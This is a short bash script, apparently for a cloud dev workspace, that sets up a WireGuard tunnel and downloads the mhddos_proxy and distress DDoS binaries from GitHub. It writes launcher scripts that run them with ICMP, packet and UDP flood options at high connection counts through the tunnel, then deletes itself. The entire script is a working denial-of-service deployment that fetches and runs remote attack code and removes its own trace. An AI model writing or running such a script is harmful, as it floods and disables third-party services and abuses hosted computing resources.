#!/bin/bash
cd && apt update -y && apt install -y net-tools iputils-ping wireguard-tools mc vnstat screen tmux && service vnstat start && echo '/usr/sbin/vnstatd --daemon' >> ~/.bashrc ; cd /workspaces/wg ; sudo cp wg0.conf /etc/wireguard/wg0.conf ; cd && curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo md && touch md.sh && echo -e '#!/bin/bash\nip link show wg0 >/dev/null 2>&1 || wg-quick up wg0 && clear && screen -S md ./md --use-my-ip 7 --ifaces wg0 --copies 2 --user-id '"$1"' -t 8000' > md.sh && curl https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl -Lo ds && echo -e '#!/bin/bash\nip link show wg0 >/dev/null 2>&1 || wg-quick up wg0 && clear && screen -S ds ./ds --use-my-ip 25 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --interface wg0 --user-id '"$1"' -c 16000' > ds.sh && chmod +x md ds md.sh ds.sh ; rm -rf md_ds_wg.sh
